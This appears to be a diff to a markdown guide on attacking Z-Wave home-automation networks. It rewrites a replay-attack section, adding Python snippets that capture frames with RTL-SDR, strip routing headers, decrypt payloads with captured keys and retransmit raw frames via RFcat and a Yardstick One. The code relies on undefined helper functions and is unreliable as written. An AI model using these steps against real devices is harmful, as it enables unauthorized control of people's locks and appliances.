@@ -298,29 +298,46 @@ This outlines a brute force attack targeting the PIN exchanged during the inclus
 - Python
 - RFcat
 
-1. **Capture Z-Wave Packets:**
-   - Use RTL-SDR and Gqrx to capture Z-Wave packets between controller and nodes.
+Here are the steps to perform a Z-Wave replay attack by capturing and retransmitting raw command frames:
 
-2. **Analyze Packets:**
-   - Analyze packets in Audacity to understand Z-Wave framing.
+1. Use an RTL-SDR dongle and Gqrx to capture Z-Wave traffic between the controller and nodes.
 
-3. **Strip Encapsulation:**
-   - Write a Python script to strip the routing encapsulation and extract the command payload.
+2. Analyze the captured packets in Audacity to understand the Z-Wave framing format.
 
-4. **Decrypt Payload:**
-   - If the payload is encrypted, attempt to decrypt it using captured encryption keys.
+3. Write a Python script to parse the packets and strip the routing encapsulation to extract just the command payload:
 
-5. **Craft Raw Z-Wave Command Frame:**
-   - Craft a raw Z-Wave command frame with the decrypted payload.
+```python
+def extract_payload(packet):
 
-6. **Replay Raw Frame:**
-   - Use RFcat with Yardstick One to replay the raw frame.
+  # Strip routing header 
+  payload = packet[12:]  
 
-7. **Successful Replay:**
-    - The target node will process the raw Z-Wave command without encapsulation.
+  # Return decrypted payload if encrypted
+  if is_encrypted(payload):
+    return decrypt(payload)
 
-By de-encapsulating packets, an attacker removes routing information to obtain raw command frames that can be replayed directly to nodes after decrypting payloads.
+  return payload
+```
 
+4. If the payload is encrypted, attempt to decrypt it using captured encryption keys.
+
+5. Craft a raw Z-Wave command frame with just the stripped payload:
+
+```python
+frame = construct_zwave_frame(payload) 
+```
+
+6. Use the Yardstick One and RFcat to transmit the raw command frame:
+
+```python
+d = rfcat.RFcat()
+d.setFreq(908420000)
+d.RFxmit(frame)
+```
+
+7. If successful, the target node will process the command in the raw frame without any routing encapsulation.
+
+This allows replaying captured commands by extracting just the bare payload and transmitting it within a raw Z-Wave frame.
 
 4. **Capture Z-Wave Signals:**
 
